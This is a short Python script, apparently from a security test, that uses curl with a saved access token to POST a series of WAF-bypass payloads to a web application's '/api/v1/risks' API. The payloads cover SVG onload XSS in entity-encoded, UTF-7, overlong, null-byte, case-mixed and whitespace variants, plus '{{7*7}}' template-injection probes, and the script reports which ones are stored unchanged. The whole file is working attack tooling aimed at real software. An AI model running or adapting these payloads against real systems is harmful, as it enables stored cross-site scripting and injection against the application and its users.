import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_OWNER').read().strip()
tag='ZXH'+uuid.uuid4().hex[:5]
def call(pay,field='name'):
    cmd=['curl','-s','-m','25','-o','/tmp/hb','-w','%{http_code}','-X','POST',H+'/api/v1/risks',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps({"risk":{field:pay}})]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/hb',encoding='utf-8',errors='replace').read()
print("=== WAF bypass attempts for <svg / <script / {{ ===")
tests=[
 ('svg-entity', f'&#60;svg onload=alert(1)&#62;{tag}'),
 ('svg-hexent', f'&#x3c;svg onload=alert(1)&#x3e;{tag}'),
 ('svg-double', f'&amp;lt;svg&amp;gt;{tag}'),
 ('svg-utf7', f'+ADw-svg+AD4-{tag}'),
 ('svg-overlong', f'%c0%bcsvg%c0%be{tag}'),
 ('svg-null', f'<s\x00vg onload=alert(1)>{tag}'),
 ('svg-case', f'<SvG oNlOaD=alert(1)>{tag}'),
 ('svg-space', f'< svg onload=alert(1)>{tag}'),
 ('svg-nl', f'<svg\nonload=alert(1)>{tag}'),
 ('svg-tab', f'<svg\tonload=alert(1)>{tag}'),
 ('svg-comment', f'<svg/**/onload=alert(1)>{tag}'),
 ('brace-entity', f'&#123;&#123;7*7&#125;&#125;{tag}'),
 ('brace-null', f'{{\x00{{7*7}}}}{tag}'),
 ('brace-space', f'{{ {{7*7}} }}{tag}'),
]
for label,pay in tests:
    c,b=call(pay)
    st=''
    if c in ('200','201'):
        try: st=repr(json.loads(b)['risks'][0].get('name'))[:60]
        except: st=''
    print(f"  {label:14} {c:>4}  {st}")
